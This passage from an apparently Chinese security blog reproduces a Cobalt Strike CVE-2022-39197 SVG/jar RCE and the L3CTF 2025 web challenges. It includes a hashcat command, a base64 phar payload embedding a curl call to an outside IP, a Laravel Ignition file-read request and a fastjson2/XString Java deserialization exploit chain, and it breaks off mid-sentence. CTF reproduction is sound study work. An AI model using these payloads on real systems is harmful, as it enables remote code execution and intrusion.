class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>            </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>                </span><br><span class="line">            <span class="tag">&lt;<span class="name">archive</span>&gt;</span>                    </span><br><span class="line">            <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span>                        </span><br><span class="line">            <span class="tag">&lt;<span class="name">build-time</span>&gt;</span>$&#123;maven.build.timestamp&#125;<span class="tag">&lt;/<span class="name">build-time</span>&gt;</span>   </span><br><span class="line">                <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span>                    </span><br><span class="line">                <span class="tag">&lt;<span class="name">manifestFile</span>&gt;</span>src/main/resources/META-INF/MANIFEST.MF<span class="tag">&lt;/<span class="name">manifestFile</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;/<span class="name">archive</span>&gt;</span>            </span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>       </span><br><span class="line">                 <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>    </span><br><span class="line">                 <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>构造svg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;application/java-archive&quot;</span> <span class="attr">xlink:href</span>=<span class="string">&quot;http://127.0.0.1:8000/POC-1.0-SNAPSHOT.jar&quot;</span>/&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">text</span>&gt;</span>Static text ...<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>测试demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;  </span><br><span class="line"><span class="keyword">import</span> java.awt.*;  </span><br><span class="line"><span class="keyword">import</span> org.apache.batik.swing.JSVGCanvas;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SwingDemo</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">JFrame</span> <span class="variable">frame</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JFrame</span>(<span class="string">&quot;SwingDemo&quot;</span>);  </span><br><span class="line">        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);  </span><br><span class="line">        frame.setPreferredSize(<span class="keyword">new</span> <span class="title class_">Dimension</span>(<span class="number">400</span>, <span class="number">400</span>));  </span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">label</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;&lt;html&gt;&lt;object classid=&#x27;org.apache.batik.swing.JSVGCanvas&#x27;&gt;&lt;param name=&#x27;URI&#x27; value=&#x27;http://127.0.0.1:8001/evilSVG.svg&#x27;&gt;&lt;/object&gt;&quot;</span>);  </span><br><span class="line">        frame.getContentPane().add(label);  </span><br><span class="line">        frame.pack();  </span><br><span class="line">        frame.setVisible(<span class="literal">true</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250929213834.png" alt="image.png"></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://lorexxar.cn/2022/11/02/cs-xss2rce/">https://lorexxar.cn/2022/11/02/cs-xss2rce/</a><br><a href="https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html">https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html</a><br><a href="http://www.bmth666.cn/2023/03/22/CVE-2022-39197-CS-RCE%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/index.html"># CVE-2022-39197 CS RCE复现分析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;影响范围：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cobalt Strike &amp;lt;&amp;#x3D; 4.7&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;漏洞原文：&lt;a href=&quot;https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>L3CTF 2025 WEB 复现</title>
    <link href="http://example.com/2025/09/26/L3CTF-2025-WEB-%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2025/09/26/L3CTF-2025-WEB-%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-09-25T16:06:05.000Z</published>
    <updated>2025-09-25T16:07:41.093Z</updated>
    
    <content type="html"><![CDATA[<h1 id="L3CTF-2025-WEB-复现"><a href="#L3CTF-2025-WEB-复现" class="headerlink" title="L3CTF 2025 WEB 复现"></a><strong>L3CTF 2025 WEB 复现</strong></h1><h2 id="gogogo出发喽"><a href="#gogogo出发喽" class="headerlink" title="gogogo出发喽"></a>gogogo出发喽</h2><p>hashcat爆破密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat.exe -m 3200 -a 0 E:\CTFDoc\2025\L3CTF\hash.txt D:\CyberSecurity\wordlists\fuzzDicts\passwordDict\top6000.txt</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250712162912.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/admin</span><br><span class="line">admin / amdin888</span><br></pre></td></tr></table></figure><p>文件上传</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/image/base64</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-makefile"><span class="section">Host: 1.95.34.119:41164</span></span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile"><span class="section">Content-Type: application/json</span></span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile"><span class="section">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile"><span class="section">Content-Length: 548</span></span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile">  </span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile">&#123;</span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile"><span class="string">&quot;data&quot;</span>: <span class="string">&quot;data:image/gif;base64,PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQo9AQAAAQAAABEAAAABAAAAAAAHAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozNDoiSWxsdW1pbmF0ZVxRdWV1ZVxDYWxsUXVldWVkQ2xvc3VyZSI6MTp7czoxMzoiACoAY29ubmVjdGlvbiI7czozMToiY3VybCBodHRwOi8vMTA3LjE0OC43NS4yMDI6MTIzNCI7fX0IAAAAdGVzdC50eHQEAAAANY9yaAQAAAAMfn/YtgEAAAAAAAB0ZXN0fKVdq0XQ8HZBfwIxQeP1z2aInN4CAAAAR0JNQg==&quot;</span></span></span><br><span class="line"><span class="language-makefile"></span></span><br><span class="line"><span class="language-makefile">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /uploads/images/_A6oMsyFWyQy5T1kO.gif HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 1.95.34.119:41164</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 1.95.34.119:41164</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">Content-Length: 198</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#123;&quot;solution&quot;:&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;usesname&quot;,&quot;viewFile&quot;:&quot;/proc/self/cmdline&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>使用phar反序列化套fast destruct<br><a href="https://eastjun.top/posts/php_unserialize_tricks/">https://eastjun.top/posts/php_unserialize_tricks/</a></p><p>未完工</p><h2 id="Tellmewhy"><a href="#Tellmewhy" class="headerlink" title="Tellmewhy"></a>Tellmewhy</h2><p><a href="https://su-team.cn/posts/e3fd1be7.html#tellmewhy">https://su-team.cn/posts/e3fd1be7.html#tellmewhy</a></p><p>有fastjson2, snakeyaml等依赖<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250915195152.png" alt="image.png"></p><p>HomeController中<code>/baby/why</code>路由存在反序列化点<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250915195330.png" alt="image.png"></p><p><code>MyInputObjectStream</code> 重写了<code>resolveClass</code>, 黑名单过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blacklist = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line"><span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>, </span><br><span class="line"><span class="string">&quot;javax.swing.event.EventListenerList&quot;</span>, </span><br><span class="line"><span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>禁了<code>BadAttributeValueExpException</code>这个<code>readObject</code> –&gt; <code>toString</code>的链子<br>fastjson1中有toString –&gt; getter的链子, 同样地, fastjson2中也存在这样的了链子</p><p>fastjson2与fastjson1有所不同 ,在fastjson2中 构造反序列化链触发templates会进入黑名单 [[Fastjson2 与 fastjson1 异同]]<br>[[Fastjson原生反序列化 Gadget分析]]<br>绕过思路是:<br><a href="https://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q">高版本Fastjson在Java原生反序列化中的利用 ### 绕过思路三：使用动态代理</a><br><code>IGNORE_CLASS_HASH_CODES</code>黑名单列表，<code>TemplatesImpl</code>的上层接口<code>javax.xml.transform.Templates</code>并不在其中，而**<code>getOutputProperties</code>方法正是<code>Templates</code>接口定义的方法，于是可用通过动态代理来触发</p><p>题目使用的是solon框架, 没有<code>JdkDynamicAopProxy</code>这些类, 但给出了一个MyProxy, 恰好作为templates的代理<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250916230708.png" alt="image.png"><br>这里MyProxy只能代理<code>MyObject</code>, 不过被代理的对象是由<code>this.myObject.getObject()</code>得到, 我们只需要再找到一个代理类, 代理这个<code>MyObject</code>, 当调用它的任意方法时, 返回特定的对象</p><p>所以这里 toString –&gt; getter –&gt; definclass 理论上是通的<br>写个demo测试一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONObject;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> org.example.demo.Utils.MyObject;  </span><br><span class="line"><span class="keyword">import</span> org.example.demo.Utils.MyProxy;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.tools.ShellCode.getEvilTemplatesImpl;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesNode1</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObjectHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();  </span><br><span class="line">        jsonObjectHandler.put(<span class="string">&quot;object&quot;</span>, templatesNode1);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">myObjectOfTemplates</span> <span class="operator">=</span> (MyObject) Proxy.newProxyInstance(jsonObjectHandler.getClass().getClassLoader(),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;MyObject.class&#125;, jsonObjectHandler);  </span><br><span class="line">        System.out.println(myObjectOfTemplates.getObject());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">MyProxy</span> <span class="variable">myProxyHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyProxy</span>(myObjectOfTemplates);  </span><br><span class="line">        <span class="type">Templates</span> <span class="variable">myProxyTemplates</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(myObjectOfTemplates.getClass().getClassLoader(),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, myProxyHandler);  </span><br><span class="line">  </span><br><span class="line">        myProxyTemplates.getOutputProperties();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">toStringNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();  </span><br><span class="line">        toStringNode.put(<span class="string">&quot;n4c1&quot;</span>, toStringNode);  </span><br><span class="line">        toStringNode.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250923214257.png" alt="image.png"></p><p>没什么问题, 接下来的问题就是 readObject –&gt; toString</p><p>这里尝试用[[tabby]]搜一下</p><p>题目jar包的字节码版本是52.0, 对应java 8<br>修改tabby的配置文件</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tabby.build.isJDKProcess</span>                  = <span class="string">true</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># targets to analyse</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tabby.build.target</span>                        = <span class="string">target</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tabby.build.libraries</span>                     = <span class="string">libs</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tabby.build.mode</span>                          = <span class="string">gadget</span></span><br></pre></td></tr></table></figure><p>cases目录放题目jar包, libs目录放jdk8u65的rt.jar</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MATCH (source:Method &#123;NAME:<span class="string">&quot;readObject&quot;</span>, CLASSNAME:<span class="string">&quot;java.util.HashMap&quot;</span>&#125;)</span><br><span class="line">MATCH (sink:Method &#123;NAME:<span class="string">&quot;toString&quot;</span>, CLASSNAME:<span class="string">&quot;com.alibaba.fastjson2.JSONArray&quot;</span>&#125;)</span><br><span class="line">CALL apoc.algo.allSimplePaths(source, sink, <span class="string">&quot;CALL&gt;|ALIAS&gt;&quot;</span>, <span class="number">8</span>) YIELD path</span><br><span class="line">WHERE none(n in nodes(path) WHERE n.CLASSNAME IN [</span><br><span class="line">  <span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>,</span><br><span class="line">  <span class="string">&quot;javax.swing.event.EventListenerList&quot;</span>,</span><br><span class="line">  <span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span></span><br><span class="line">])</span><br><span class="line">RETURN path LIMIT <span class="number">10</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250925220040.png" alt="image.png"><br>第一次用tabby, 确实可以搜索到[[XString链]]这条链子, 但是其他干扰还是比较多</p><p>找到XString, 这里确实能触发到toStirng</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250925220722.png" alt="image.png"></p><p>据此写出exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONObject;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> org.example.demo.Utils.MyObject;  </span><br><span class="line"><span class="keyword">import</span> org.example.demo.Utils.MyProxy;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.tools.ShellCode.getEvilTemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.tools.Tools.*;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesNode1</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObjectHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();  </span><br><span class="line">        jsonObjectHandler.put(<span class="string">&quot;object&quot;</span>, templatesNode1);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">myObjectOfTemplates</span> <span class="operator">=</span> (MyObject) Proxy.newProxyInstance(jsonObjectHandler.getClass().getClassLoader(),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;MyObject.class&#125;, jsonObjectHandler);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">MyProxy</span> <span class="variable">myProxyHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyProxy</span>(myObjectOfTemplates);  </span><br><span class="line">        <span class="type">Templates</span> <span class="variable">myProxyTemplates</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(myObjectOfTemplates.getClass().getClassLoader(),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, myProxyHandler);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">toStringNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();  </span><br><span class="line">        toStringNode.put(<span class="string">&quot;1&quot;</span>, myProxyTemplates);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/// //////////////////  </span></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        hashMap1.put(<span class="string">&quot;yy&quot;</span>,toStringNode);  </span><br><span class="line">        hashMap1.put(<span class="string">&quot;zz&quot;</span>, xString);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        hashMap2.put(<span class="string">&quot;yy&quot;</span>,xString);  </span><br><span class="line">        hashMap2.put(<span class="string">&quot;zz&quot;</span>,toStringNode);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> makeMap(hashMap1, hashMap2);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(obj);  </span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">makeMap</span><span class="params">(Object v1, Object v2)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class nodeC;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));  </span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以rce, 让人不解的是, 为什么<code>new XString(&quot;\n&quot;);</code>直接运行生成的poc可以弹计算器, 但是<code>new XString(&quot;1&quot;);</code>直接运行生成的poc就弹不了, 